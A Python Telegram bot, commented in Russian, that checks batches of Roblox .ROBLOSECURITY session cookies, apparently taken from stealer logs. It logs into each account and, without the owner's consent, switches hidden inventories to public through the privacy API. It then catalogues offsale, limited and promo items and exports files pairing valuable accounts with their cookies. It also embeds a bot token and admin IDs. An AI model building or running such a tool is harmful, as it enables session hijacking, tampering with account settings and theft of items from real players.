"""
Roblox Offsale Checker Bot
- Одна сессия на аккаунт (кук в заголовке)
- Инвентарь загружается по типам параллельно
- Детали предметов проверяются батчами по 120 через catalog API
- Оффсейл = priceStatus == "Off Sale" или IsForSale == False
- Промо = предметы из CODE_ITEMS
"""

import asyncio
import io
import re
import os
import aiohttp
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions, BufferedInputFile
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================================================================
#  НАСТРОЙКИ
# ================================================================
BOT_TOKEN = "8035442503:AAG-gdNAKMFhnyyaHGfjeMdh48-sa-Jd55A"
ADMIN_IDS = {5883796026, 115536598}

YEAR_FROM   = 2006
YEAR_TO     = 2030
CHECK_PROMO = True

ASSET_TYPES = {
    "faces":    True,
    "hats":     True,
    "hair":     True,
    "neck":     True,
    "shoulder": True,
    "front":    True,
    "back":     True,
    "waist":    True,
    "gear":     True,
    "clothing": False,
}
# ================================================================

# v2 API: строковые имена типов
ASSET_TYPE_STRINGS = {
    "faces":    "Face",
    "hats":     "Hat",
    "hair":     "HairAccessory",
    "neck":     "FaceAccessory",
    "shoulder": "ShoulderAccessory",
    "front":    "FrontAccessory",
    "back":     "BackAccessory",
    "waist":    "WaistAccessory",
    "gear":     "Gear",
    "clothing_shirt": "Shirt",
    "clothing_pants": "Pants",
}

ASSET_LABELS = {
    "faces":    "👤 Лица",
    "hats":     "🎩 Шапки",
    "hair":     "💇 Волосы",
    "neck":     "📿 Шея",
    "shoulder": "🦴 Плечи",
    "front":    "🧣 Передние",
    "back":     "🎒 Задние",
    "waist":    "🩱 Пояс",
    "gear":     "⚔️ Снаряжение",
    "clothing": "👕 Одежда",
}

CODE_ITEMS = {
    189934238:  "Fireman",
    4342314393: "Rainbow Squid Unicorn",
    263405835:  "Chicken Headrow",
    263405839:  "Black Iron Tentacles",
    263405842:  "Code Review Specs",
    263405844:  "Stickpack",
    263405846:  "Shark Fin",
    263405849:  "Federation Necklace",
    263405851:  "Backup Mr. Robot",
    263405853:  "Dark Lord of SQL",
    263405855:  "Roblox visor 1",
    263405857:  "Silver Bow Tie",
    263405859:  "Dodgeball Helmet",
    263405861:  "Shoulder Raccoon",
    263405863:  "Dued1",
    263405865:  "Pauldrons",
    263405867:  "Octember Encore",
    263405869:  "Umberhorns",
    128540404:  "Police Cap",
    128540406:  "American Baseball Cap",
    128540408:  "Orange Cap",
    218491492:  "Navy Queen otn",
    128540410:  "Zombie Knit",
    128540412:  "Epic Miners Headlamp",
    128540414:  "Beast Mode Bandana",
    162295698:  "Golden Reingment",
    128540416:  "Beast Scythe",
    128540418:  "Hare Hoodie",
    128540420:  "Diamond Tiara",
    128540422:  "Callmehbob",
    128540424:  "Sword Cane",
    128540426:  "Selfie Stick",
    128540428:  "Phantom Forces Combat Knife",
    128540430:  "Golden Horns",
    128540432:  "The Soup is Dry",
    128540434:  "Monster Grumpy Face",
    128540436:  "Elegant Evening Face",
    128540438:  "Super Pink Make-Up",
    128540440:  "Cyanskeleface",
    128540442:  "Pizza Face",
    128540444:  "Bakonetta",
    128540446:  "Isabella",
    128540448:  "Mon Cheri",
    128540450:  "Rogueish Good Looks",
    128540452:  "Mixologist's Smile",
    128540454:  "BiteyMcFace",
    128540456:  "Performing Mime",
    128540458:  "Rainbow Spirit Face",
    128540460:  "Mermaid Mystique",
    128540462:  "Starry Eyes Sparkling",
    128540464:  "Sparkling Friendly Wink",
    128540466:  "Kandi's Sprinkle Face",
    128540468:  "Tears of Sorrow",
    128540470:  "Fashion Face",
    128540472:  "Princess Alexis",
    128540474:  "Otakufaic",
    128540476:  "Pop Queen",
    128540478:  "Assassin Face",
    128540480:  "Sapphire Gaze",
    128540482:  "Persephone's E-Girl",
    128540484:  "Arachnid Queen",
    128540486:  "Rainbow Barf Face",
    128540488:  "Star Sorority",
    128540490:  "Tsundere Face",
    128540492:  "Winning Smile",
}

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"

# ================================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp  = Dispatcher(storage=MemoryStorage())

settings = {
    "year_from":   YEAR_FROM,
    "year_to":     YEAR_TO,
    "check_promo": CHECK_PROMO,
    "asset_types": dict(ASSET_TYPES),
}

class SetYear(StatesGroup):
    from_year = State()
    to_year   = State()

class SearchState(StatesGroup):
    waiting_for_term   = State()
    waiting_for_cookie = State()


# ================================================================
#  COOKIE PARSING
# ================================================================

def parse_cookie(raw: str) -> str:
    c = raw.strip()
    if "Cookie: " in c:
        c = c.split("Cookie: ")[-1].strip()
    # _|WARNING:-...|_COOKIE  (новый формат)
    if c.startswith("_|WARNING") and "|_" in c:
        c = c.split("|_", 1)[-1].strip()
    # _|WARNING:-...--|COOKIE  (старый формат)
    elif "_|WARNING" in c and "--|" in c:
        c = c.split("--|", 1)[-1].strip()
    for p in [".ROBLOSECURITY=", "ROBLOSECURITY="]:
        if c.lower().startswith(p.lower()):
            c = c[len(p):]
    return c.strip()


def is_cookie(val: str) -> bool:
    if len(val) < 50 or " " in val:
        return False
    for bad in ["Username", "Cookie:", "WARNING", "Birthdate", "Country",
                "Robux", "Email", "Playtime", "Gamepass", "Badge",
                "Sessions", "Followers", "roblox.com", "http",
                "Pending", "Billing", "AllTime", "Voice", "Visits"]:
        if bad in val:
            return False
    return bool(re.match(r'^[A-Za-z0-9\-_=+/.%]+$', val))


def extract_cookies(text: str) -> list:
    cookies, seen = [], set()
    for line in re.split(r'\r?\n', text):
        line = line.strip()
        if not line:
            continue
        val = parse_cookie(line)
        if is_cookie(val) and val not in seen:
            seen.add(val)
            cookies.append(val)
    return cookies


# ================================================================
#  ROBLOX SESSION
# ================================================================

def make_session(cookie: str) -> aiohttp.ClientSession:
    """Одна сессия на аккаунт — кук в заголовке."""
    return aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False, limit=20),
        timeout=aiohttp.ClientTimeout(total=30),
        headers={
            "Cookie":          ".ROBLOSECURITY=" + cookie,
            "User-Agent":      UA,
            "Accept":          "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer":         "https://www.roblox.com/",
            "Origin":          "https://www.roblox.com",
        }
    )


# ================================================================
#  AUTH
# ================================================================

async def get_user_info(session: aiohttp.ClientSession):
    for url, id_key, name_key in [
        ("https://users.roblox.com/v1/users/authenticated", "id", "displayName"),
        ("https://www.roblox.com/mobileapi/userinfo", "UserID", "UserName"),
    ]:
        try:
            async with session.get(url) as r:
                if r.status == 200:
                    d = await r.json(content_type=None)
                    uid = d.get(id_key) or d.get("id")
                    if uid:
                        name = d.get(name_key) or d.get("name") or "?"
                        return {"id": int(uid), "name": name}
        except Exception:
            pass
    return None


# ================================================================
#  OPEN INVENTORY
# ================================================================

async def open_inventory(session: aiohttp.ClientSession) -> bool:
    """Открывает инвентарь через ту же сессию с куком."""
    csrf = None
    for url in ["https://auth.roblox.com/v2/logout",
                "https://accountsettings.roblox.com/v1/email"]:
        try:
            async with session.post(url) as r:
                t = r.headers.get("x-csrf-token")
                if t:
                    csrf = t
                    break
        except Exception:
            pass

    if not csrf:
        return False

    hdrs = {"x-csrf-token": csrf, "Content-Type": "application/json"}
    for method, url, body in [
        ("patch", "https://accountsettings.roblox.com/v1/privacy/inventory-privacy",
                  {"inventoryPrivacy": 1}),
        ("post",  "https://accountsettings.roblox.com/v1/privacy/inventory-privacy",
                  {"inventoryPrivacy": 1}),
        ("patch", "https://accountsettings.roblox.com/v1/privacy",
                  {"InventoryPrivacySetting": "AllUsers"}),
    ]:
        try:
            fn = session.patch if method == "patch" else session.post
            async with fn(url, json=body, headers=hdrs) as r:
                if r.status in (200, 204):
                    return True
        except Exception:
            pass
    return False


# ================================================================
#  LOAD INVENTORY — параллельно по типам
# ================================================================

async def load_one_type(session: aiohttp.ClientSession,
                        user_id: int, type_str: str) -> list:
    """Загружает все предметы одного типа."""
    ids, cursor = [], ""
    url = "https://inventory.roblox.com/v2/users/{}/inventory".format(user_id)
    while True:
        params = {"assetTypes": type_str, "limit": 100, "sortOrder": "Asc"}
        if cursor:
            params["cursor"] = cursor
        try:
            async with session.get(url, params=params) as r:
                if r.status == 403:
                    return []  # закрыт
                if r.status != 200:
                    break
                data = await r.json(content_type=None)
                for it in data.get("data", []):
                    aid = it.get("assetId") or it.get("id")
                    if aid:
                        ids.append(int(aid))
                cursor = data.get("nextPageCursor") or ""
                if not cursor:
                    break
        except Exception:
            break
        await asyncio.sleep(0.1)
    return ids


async def load_inventory(session: aiohttp.ClientSession,
                         user_id: int) -> list:
    """
    Загружает весь инвентарь параллельно по типам.
    Если закрыт — открывает и повторяет.
    """
    # Собираем нужные типы
    types = []
    for key, on in settings["asset_types"].items():
        if not on:
            continue
        if key == "clothing":
            types += ["Shirt", "Pants"]
        else:
            ts = ASSET_TYPE_STRINGS.get(key)
            if ts:
                types.append(ts)

    async def fetch_all():
        tasks = [load_one_type(session, user_id, t) for t in types]
        results = await asyncio.gather(*tasks)
        ids = set()
        got_403 = False
        for i, lst in enumerate(results):
            if not lst and types[i]:
                # Проверим — может 403
                got_403 = True  # предположим, откроем на всякий
            ids.update(lst)
        return ids, got_403

    all_ids, _ = await fetch_all()

    # Если пустой — пробуем открыть и перезагрузить
    if not all_ids:
        opened = await open_inventory(session)
        if opened:
            await asyncio.sleep(2)
            all_ids, _ = await fetch_all()

    return sorted(all_ids)


# ================================================================
#  BATCH CATALOG API — 120 предметов за запрос, быстро
# ================================================================

async def catalog_batch(asset_ids: list) -> dict:
    """
    Получает детали предметов через catalog API батчами по 120.
    Возвращает {asset_id: item_dict}.
    НЕ нужен кук — публичный API.
    """
    result = {}
    conn = aiohttp.TCPConnector(ssl=False)
    hdrs = {"User-Agent": UA, "Content-Type": "application/json",
            "Accept": "application/json"}

    async with aiohttp.ClientSession(connector=conn, headers=hdrs,
                                     timeout=aiohttp.ClientTimeout(total=30)) as s:
        # Параллельные батчи
        chunks = [asset_ids[i:i+120] for i in range(0, len(asset_ids), 120)]

        async def fetch_chunk(chunk):
            payload = {"items": [{"itemType": "Asset", "id": aid} for aid in chunk]}
            for attempt in range(3):
                try:
                    async with s.post(
                        "https://catalog.roblox.com/v1/catalog/items/details",
                        json=payload
                    ) as r:
                        if r.status == 200:
                            data = await r.json(content_type=None)
                            for item in data.get("data", []):
                                aid = item.get("id")
                                if aid:
                                    result[int(aid)] = item
                            return
                        if r.status == 429:
                            await asyncio.sleep(3)
                            continue
                except Exception:
                    pass
                await asyncio.sleep(1)

        # До 5 батчей одновременно
        sem = asyncio.Semaphore(5)
        async def guarded(chunk):
            async with sem:
                await fetch_chunk(chunk)

        await asyncio.gather(*[guarded(c) for c in chunks])

    return result


def is_offsale(item: dict) -> bool:
    """Определяет оффсейл по данным catalog API."""
    ps = item.get("priceStatus") or ""
    if ps == "Off Sale":
        return True
    if ps == "No Price" and item.get("price") is None:
        return True
    return False


def item_year(item: dict) -> int:
    """Год создания из данных catalog API."""
    for f in ("createdUtc", "created", "Created"):
        v = item.get(f)
        if v:
            try:
                return datetime.fromisoformat(str(v).replace("Z", "+00:00")).year
            except Exception:
                pass
    return 0


# ================================================================
#  MAIN CHECK — быстрый
# ================================================================

async def check_account(cookie: str, on_status, mode="offsale", search_term=None):
    result = {
        "valid": False, "user_id": None, "username": None,
        "offsale": [], "promo_found": [], "inv_total": 0, "search_results": [],
    }

    async with make_session(cookie) as session:

        # 1. Авторизация
        user_info = await get_user_info(session)
        if not user_info:
            return result
        result.update({"valid": True,
                        "user_id": user_info["id"],
                        "username": user_info["name"]})
        uid, uname = user_info["id"], user_info["name"]

        # 2. Инвентарь (параллельно по типам)
        await on_status("✅ <b>{}</b>\n📦 Загружаю инвентарь...".format(uname))
        all_ids = await load_inventory(session, uid)
        result["inv_total"] = len(all_ids)

        if not all_ids:
            return result

        # ── ПОИСК ──────────────────────────────────────────────────
        if mode == "search" and search_term:
            term_lo = search_term.lower()
            await on_status("✅ <b>{}</b>\n🔍 Ищу «{}» ({} предм.)...".format(
                uname, search_term, len(all_ids)))

            # Батч-запрос
            catalog = await catalog_batch(all_ids)
            for aid, item in catalog.items():
                name = item.get("name") or item.get("Name") or ""
                if term_lo in name.lower():
                    result["search_results"].append({
                        "id": aid, "name": name, "year": item_year(item)
                    })
            return result

        # ── ОФФСЕЙЛ ────────────────────────────────────────────────

        await on_status("✅ <b>{}</b>\n🔍 Проверяю {} предметов...".format(
            uname, len(all_ids)))

        # Батч-запрос — все предметы за несколько запросов
        catalog = await catalog_batch(all_ids)

        for aid, item in catalog.items():
            if not is_offsale(item):
                continue
            year = item_year(item)
            if year and not (settings["year_from"] <= year <= settings["year_to"]):
                continue
            restrictions = item.get("itemRestrictions") or []
            is_unique    = "LimitedUnique" in restrictions
            is_limited   = "Limited" in restrictions or is_unique
            name         = item.get("name") or item.get("Name") or "ID:{}".format(aid)
            result["offsale"].append({
                "id": aid, "name": name, "year": year,
                "limited": is_limited, "unique": is_unique,
            })

        # Промо — проверяем пересечение с CODE_ITEMS
        if settings["check_promo"]:
            await on_status("✅ <b>{}</b>\n🎁 Проверяю промо...".format(uname))
            ids_set = set(all_ids)
            for promo_id, promo_name in CODE_ITEMS.items():
                if promo_id in ids_set:
                    result["promo_found"].append(
                        {"id": promo_id, "name": promo_name}
                    )

    return result


# ================================================================
#  SILENT CHECK С ПОВТОРАМИ
# ================================================================

async def silent_check(cookie: str, mode="offsale", search_term=None) -> dict:
    empty = {
        "valid": False, "user_id": None, "username": None,
        "offsale": [], "promo_found": [], "inv_total": 0, "search_results": [],
    }

    async def noop(t):
        pass

    last = empty
    for attempt in range(1, 4):
        try:
            r = await check_account(cookie, noop, mode=mode, search_term=search_term)
        except Exception:
            await asyncio.sleep(2 * attempt)
            continue
        if not r["valid"]:
            return r
        if r["inv_total"] > 0:
            return r
        last = r
        if attempt < 3:
            await asyncio.sleep(3)
    return last


# ================================================================
#  ОТЧЁТ
# ================================================================

def build_report(result: dict) -> str:
    uid, uname = result["user_id"], result["username"]
    offsale, promo = result["offsale"], result["promo_found"]
    lines = [
        "📋 <b>Отчёт проверки</b>",
        '👤 <a href="https://www.roblox.com/users/{}/profile">{}</a>  (ID: {})'.format(
            uid, uname, uid),
        "📅 Период: <b>{} – {}</b>".format(settings["year_from"], settings["year_to"]),
        "📦 Предметов: <b>{}</b>".format(result.get("inv_total", 0)),
        "",
    ]
    if offsale:
        lines.append("🛑 <b>Оффсейл — {} шт.:</b>".format(len(offsale)))
        by_year = {}
        for it in sorted(offsale, key=lambda x: x["year"] or 9999):
            by_year.setdefault(it["year"] or 0, []).append(it)
        for yr in sorted(by_year):
            lines.append("\n  📆 <b>{}:</b>".format(yr or "Год неизвестен"))
            for it in by_year[yr]:
                badge = " 🔴LimitedU" if it["unique"] else (" 🟡Limited" if it["limited"] else "")
                lines.append('    • <a href="https://www.roblox.com/catalog/{}">{}</a>{}'.format(
                    it["id"], it["name"], badge))
    else:
        lines.append("🛑 Оффсейл предметов <b>не найдено</b>")
    lines.append("")
    if settings["check_promo"]:
        if promo:
            lines.append("🎁 <b>Промо — {} шт.:</b>".format(len(promo)))
            for it in promo:
                lines.append('    • <a href="https://www.roblox.com/catalog/{}">{}</a>'.format(
                    it["id"], it["name"]))
        else:
            lines.append("🎁 Промо-предметов <b>не найдено</b>")
    return "\n".join(lines)


# ================================================================
#  ОДИНОЧНАЯ ПРОВЕРКА
# ================================================================

async def run_check(message: Message, cookie: str):
    cookie = parse_cookie(cookie)
    if not is_cookie(cookie):
        await message.answer("❌ Не похоже на кук Roblox.")
        return

    sm = await message.answer("⏳ <b>Авторизация...</b>")

    async def upd(text):
        try:
            await sm.edit_text(text)
        except Exception:
            pass

    try:
        result = await check_account(cookie, upd)
    except Exception as e:
        await sm.edit_text("❌ Ошибка:\n<code>{}</code>".format(e))
        return

    if not result["valid"]:
        await sm.edit_text("❌ <b>Невалидный cookie</b>")
        return

    report = build_report(result)
    if len(report) > 3800:
        await sm.delete()
        f = BufferedInputFile(report.encode(), filename="report_{}.txt".format(result["user_id"]))
        await message.answer_document(f, caption="📋 {}".format(result["username"]))
    else:
        await sm.edit_text(report, link_preview_options=LinkPreviewOptions(is_disabled=True))


# ================================================================
#  БАТЧ
# ================================================================

async def run_batch(message: Message, cookies: list):
    total    = len(cookies)
    results  = [None] * total
    counter  = {"done": 0, "valid": 0, "invalid": 0}
    seen_ids = {}
    dupes    = 0

    prog = await message.answer("⏳ Проверяю 0/{}...".format(total))

    for i, c in enumerate(cookies):
        r = await silent_check(c)
        results[i] = (r, c)
        counter["done"] += 1
        if r["valid"]:
            counter["valid"] += 1
            uid = r["user_id"]
            if uid in seen_ids:
                dupes += 1
            else:
                seen_ids[uid] = i
        else:
            counter["invalid"] += 1
        try:
            await prog.edit_text("⏳ {}/{}  ✅{}  ❌{}".format(
                counter["done"], total, counter["valid"], counter["invalid"]))
        except Exception:
            pass

    try:
        await prog.delete()
    except Exception:
        pass

    valid_pairs = [(r, c) for r, c in results
                   if r and r["valid"] and r["user_id"] in seen_ids]
    hits = [(r, c) for r, c in valid_pairs if r["offsale"] or r["promo_found"]]

    await message.answer(
        "📊 <b>Итоги проверки</b>\n\n"
        "🔢 Всего: <b>{}</b>\n✅ Валидных: <b>{}</b>\n"
        "❌ Невалидных: <b>{}</b>\n👥 Дубликатов: <b>{}</b>\n\n"
        "🛑 Акков с оффсейл: <b>{}</b>\n🎁 Акков с промо: <b>{}</b>".format(
            total, counter["valid"], counter["invalid"], dupes,
            sum(1 for r, _ in valid_pairs if r["offsale"]),
            sum(1 for r, _ in valid_pairs if r["promo_found"]),
        )
    )

    if hits:
        lines = ["АККАУНТЫ С НАХОДКАМИ", "=" * 60, ""]
        for r, c in hits:
            uid, uname = r["user_id"], r["username"]
            lines += ["=" * 60,
                      "Аккаунт: {} (ID: {})".format(uname, uid),
                      "Ссылка: https://www.roblox.com/users/{}/profile".format(uid),
                      "Куки: {}".format(c), ""]
            if r["offsale"]:
                lines.append("ОФФСЕЙЛ ({} шт.):".format(len(r["offsale"])))
                for it in sorted(r["offsale"], key=lambda x: x["year"] or 9999):
                    badge = " [LimitedU]" if it["unique"] else (" [Limited]" if it["limited"] else "")
                    lines.append("  {} ({}) — https://www.roblox.com/catalog/{}{}".format(
                        it["name"], it["year"] or "?", it["id"], badge))
            lines.append("")
            if r["promo_found"]:
                lines.append("ПРОМО ({} шт.):".format(len(r["promo_found"])))
                for it in r["promo_found"]:
                    lines.append("  {} — https://www.roblox.com/catalog/{}".format(
                        it["name"], it["id"]))
            lines.append("")
        f = BufferedInputFile(
            "\n".join(lines).encode("utf-8"),
            filename="hits_{}_accs.txt".format(len(hits))
        )
        await message.answer_document(
            f, caption="🎯 {} акков с находками из {}".format(len(hits), total))
    else:
        await message.answer("😔 Ни на одном аккаунте ничего не найдено.")


# ================================================================
#  БАТЧ ПОИСК
# ================================================================

async def run_batch_search(message: Message, cookies: list, term: str):
    total    = len(cookies)
    results  = [None] * total
    counter  = {"done": 0, "valid": 0, "invalid": 0}
    seen_ids = {}
    dupes    = 0
    start    = datetime.now()

    prog = await message.answer("🔍 «{}» — 0/{}...".format(term, total))

    for i, cookie in enumerate(cookies):
        r = await silent_check(cookie, mode="search", search_term=term)
        results[i] = (r, cookie)
        counter["done"] += 1
        if r["valid"]:
            counter["valid"] += 1
            uid = r["user_id"]
            if uid in seen_ids:
                dupes += 1
            else:
                seen_ids[uid] = i
        else:
            counter["invalid"] += 1
        found_now = sum(len(x[0]["search_results"]) for x in results
                        if x and x[0] and x[0].get("search_results"))
        elapsed = (datetime.now() - start).total_seconds()
        speed   = counter["done"] / elapsed if elapsed > 0 else 0
        try:
            await prog.edit_text("🔍 «{}» — {}/{}  ✅{}  ❌{}  🎯{}  {:.1f}/с".format(
                term, counter["done"], total,
                counter["valid"], counter["invalid"], found_now, speed))
        except Exception:
            pass

    try:
        await prog.delete()
    except Exception:
        pass

    valid_pairs = [(r, c) for r, c in results
                   if r and r["valid"] and r["user_id"] in seen_ids]
    hits        = [(r, c) for r, c in valid_pairs if r.get("search_results")]
    total_found = sum(len(r["search_results"]) for r, _ in hits)
    elapsed     = (datetime.now() - start).total_seconds()

    await message.answer(
        "✅ <b>Поиск завершён</b>\n\n🔍 «<b>{}</b>»  ⏱{:.1f}с\n\n"
        "🔢<b>{}</b>  ✅<b>{}</b>  ❌<b>{}</b>  👥<b>{}</b>\n\n"
        "🎯 Акков: <b>{}</b>  📦 Предметов: <b>{}</b>".format(
            term, elapsed,
            total, counter["valid"], counter["invalid"], dupes,
            len(hits), total_found),
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )

    if hits:
        lines = ["ПОИСК: «{}»".format(term), "=" * 60,
                 "Всего: {} Валид: {} Невалид: {} Дубли: {} Время: {:.1f}с".format(
                     total, counter["valid"], counter["invalid"], dupes, elapsed), ""]
        for r, cookie in hits:
            uid, uname = r["user_id"], r["username"]
            lines += ["=" * 60,
                      "Аккаунт: {} (ID: {})".format(uname, uid),
                      "Ссылка: https://www.roblox.com/users/{}/profile".format(uid),
                      "Куки: {}".format(cookie), "",
                      "Найдено «{}» ({} шт.):".format(term, len(r["search_results"]))]
            for it in r["search_results"]:
                lines.append("  • {} ({}) — https://www.roblox.com/catalog/{}".format(
                    it["name"], it["year"] or "?", it["id"]))
            lines.append("")
        f = BufferedInputFile(
            "\n".join(lines).encode("utf-8"),
            filename="search_{}.txt".format(term.replace(" ", "_")))
        await message.answer_document(
            f, caption="🔍 «{}» на {} акках ({} шт.)".format(term, len(hits), total_found))
    else:
        await message.answer("❌ «{}» не найдено ни на одном аккаунте.".format(term))


# ================================================================
#  DO SEARCH (1 или много)
# ================================================================

async def do_search(message: Message, cookies: list, term: str):
    if not cookies:
        await message.answer("❌ Куков не найдено.")
        return
    await message.answer("🔍 <b>{}</b> куков. Ищу «{}»...".format(len(cookies), term))
    if len(cookies) == 1:
        sm = await message.answer("⏳ Авторизация...")
        async def upd(t):
            try: await sm.edit_text(t)
            except Exception: pass
        r = await check_account(cookies[0], upd, mode="search", search_term=term)
        if not r["valid"]:
            await sm.edit_text("❌ Невалидный cookie")
            return
        found = r["search_results"]
        if found:
            lines = ["🔍 <b>«{}»</b> на <b>{}</b>:\n".format(term, r["username"])]
            for it in found:
                lines.append('• <a href="https://www.roblox.com/catalog/{}">{}</a> ({})'.format(
                    it["id"], it["name"], it["year"] or "?"))
            await sm.edit_text("\n".join(lines),
                               link_preview_options=LinkPreviewOptions(is_disabled=True))
        else:
            await sm.edit_text("❌ На {} не найдено «{}».".format(r["username"], term))
    else:
        await run_batch_search(message, cookies, term)


# ================================================================
#  НАСТРОЙКИ
# ================================================================

def settings_kb() -> InlineKeyboardMarkup:
    rows = []
    for key, label in ASSET_LABELS.items():
        icon = "✅" if settings["asset_types"][key] else "❌"
        rows.append([InlineKeyboardButton(
            text="{} {}".format(icon, label), callback_data="tog_{}".format(key))])
    pi = "✅" if settings["check_promo"] else "❌"
    rows.append([InlineKeyboardButton(text="{} 🎁 Промо".format(pi), callback_data="tog_promo")])
    rows.append([
        InlineKeyboardButton(text="📅 С {}".format(settings["year_from"]), callback_data="set_yf"),
        InlineKeyboardButton(text="📅 По {}".format(settings["year_to"]),  callback_data="set_yt"),
    ])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def is_admin(obj) -> bool:
    return obj.from_user.id in ADMIN_IDS


# ================================================================
#  ХЕНДЛЕРЫ
# ================================================================

@dp.message(CommandStart())
async def cmd_start(message: Message):
    if not is_admin(message): return
    await message.answer(
        "🎮 <b>Roblox Offsale Checker</b>\n\n"
        "Отправь cookie текстом или .txt файлом\n\n"
        "⚙️ /settings\n"
        "ℹ️ /info\n"
        "🔍 /search [название]"
    )


@dp.message(Command("info"))
async def cmd_info(message: Message):
    if not is_admin(message): return
    types_on = [ASSET_LABELS[k] for k, v in settings["asset_types"].items() if v]
    await message.answer(
        "ℹ️ <b>Настройки</b>\n📅 {}-{}\n🎁 Промо: {}\n📦 {}".format(
            settings["year_from"], settings["year_to"],
            "✅" if settings["check_promo"] else "❌",
            ", ".join(types_on)))


@dp.message(Command("settings"))
async def cmd_settings(message: Message):
    if not is_admin(message): return
    await message.answer("⚙️ <b>Настройки</b>", reply_markup=settings_kb())


@dp.message(Command("search"))
async def cmd_search(message: Message, state: FSMContext):
    if not is_admin(message): return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        await message.answer("🔍 Введи название предмета:")
        await state.set_state(SearchState.waiting_for_term)
        return
    term = parts[1].strip()
    await state.update_data(search_term=term)
    await message.answer("🔍 Ищем «<b>{}</b>»\n\nОтправь куки:".format(term))
    await state.set_state(SearchState.waiting_for_cookie)


@dp.message(SearchState.waiting_for_term)
async def search_got_term(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear(); return
    term = message.text.strip()
    if not term:
        await message.answer("❌ Введи название."); return
    await state.update_data(search_term=term)
    await message.answer("🔍 Ищем «<b>{}</b>»\n\nОтправь куки:".format(term))
    await state.set_state(SearchState.waiting_for_cookie)


@dp.message(SearchState.waiting_for_cookie, F.document)
async def search_got_file(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear(); return
    data = await state.get_data()
    term = data.get("search_term", "")
    doc  = message.document
    if not doc.file_name.endswith(".txt"):
        await message.answer("❌ Нужен .txt файл"); return
    file = await bot.get_file(doc.file_id)
    buf  = io.BytesIO()
    await bot.download_file(file.file_path, destination=buf)
    buf.seek(0)
    cookies = extract_cookies(buf.read().decode("utf-8", errors="ignore"))
    await state.clear()
    await do_search(message, cookies, term)


@dp.message(SearchState.waiting_for_cookie, F.text)
async def search_got_text(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear(); return
    data    = await state.get_data()
    term    = data.get("search_term", "")
    cookies = extract_cookies(message.text)
    await state.clear()
    await do_search(message, cookies, term)


@dp.callback_query(F.data.startswith("tog_"))
async def cb_toggle(cb: CallbackQuery):
    if not is_admin(cb): return await cb.answer("⛔")
    key = cb.data.replace("tog_", "")
    if key == "promo":
        settings["check_promo"] = not settings["check_promo"]
    elif key in settings["asset_types"]:
        settings["asset_types"][key] = not settings["asset_types"][key]
    await cb.message.edit_reply_markup(reply_markup=settings_kb())
    await cb.answer("✅")


@dp.callback_query(F.data == "set_yf")
async def cb_yf(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb): return await cb.answer("⛔")
    await cb.message.answer("📅 Начальный год (сейчас {}):".format(settings["year_from"]))
    await state.set_state(SetYear.from_year)
    await cb.answer()


@dp.callback_query(F.data == "set_yt")
async def cb_yt(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb): return await cb.answer("⛔")
    await cb.message.answer("📅 Конечный год (сейчас {}):".format(settings["year_to"]))
    await state.set_state(SetYear.to_year)
    await cb.answer()


@dp.message(SetYear.from_year)
async def save_yf(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear(); return
    try:
        y = int(message.text.strip())
        assert 2006 <= y <= 2030
        settings["year_from"] = y
        await message.answer("✅ Начальный год: <b>{}</b>".format(y))
        await state.clear()
    except (ValueError, AssertionError):
        await message.answer("❌ Введи число 2006–2030")


@dp.message(SetYear.to_year)
async def save_yt(message: Message, state: FSMContext):
    if not is_admin(message):
        await state.clear(); return
    try:
        y = int(message.text.strip())
        assert 2006 <= y <= 2030
        settings["year_to"] = y
        await message.answer("✅ Конечный год: <b>{}</b>".format(y))
        await state.clear()
    except (ValueError, AssertionError):
        await message.answer("❌ Введи число 2006–2030")


@dp.message(F.document)
async def handle_file(message: Message, state: FSMContext):
    if not is_admin(message): return
    if await state.get_state(): return
    doc = message.document
    if not doc.file_name.endswith(".txt"):
        await message.answer("❌ Нужен .txt файл"); return
    file = await bot.get_file(doc.file_id)
    buf  = io.BytesIO()
    await bot.download_file(file.file_path, destination=buf)
    buf.seek(0)
    cookies = extract_cookies(buf.read().decode("utf-8", errors="ignore"))
    if not cookies:
        await message.answer("❌ Не нашёл куков в файле"); return
    await message.answer("📂 Найдено <b>{}</b> куков.".format(len(cookies)))
    if len(cookies) == 1:
        await run_check(message, cookies[0])
    else:
        await run_batch(message, cookies)


@dp.message(F.text)
async def handle_text(message: Message, state: FSMContext):
    if not is_admin(message): return
    if await state.get_state(): return
    cookies = extract_cookies(message.text)
    if not cookies:
        await message.answer("ℹ️ Отправь cookie или .txt файл\n/settings")
        return
    if len(cookies) == 1:
        await run_check(message, cookies[0])
    else:
        await run_batch(message, cookies)


# ================================================================
async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
